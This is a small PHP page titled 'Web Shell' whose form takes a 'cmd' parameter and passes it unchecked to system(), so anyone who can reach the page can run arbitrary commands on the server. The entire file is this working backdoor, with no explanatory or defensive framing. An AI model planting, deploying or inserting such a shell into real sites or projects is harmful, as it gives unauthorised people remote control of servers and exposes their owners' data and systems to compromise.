<html>
    <title>Web Shell</title>
    <meta charset="utf-8">
    <body>
        <div align="center">
            <form action="#" method="GET">
                <label>Enter Command:</label>
                <input type="text" name="cmd" placeholder="cmd...">
                <input type="submit" name="submit" value="GO!">
            </form>
            <?php
                if(isset($_GET['cmd'])) {
                    $lastln = system($_GET['cmd'], $retval);
                    if ($retval == 1) {
                        print("Command: ".$_GET['cmd']." Failed!");
                    }
                }
            ?>
        </div>
    </body>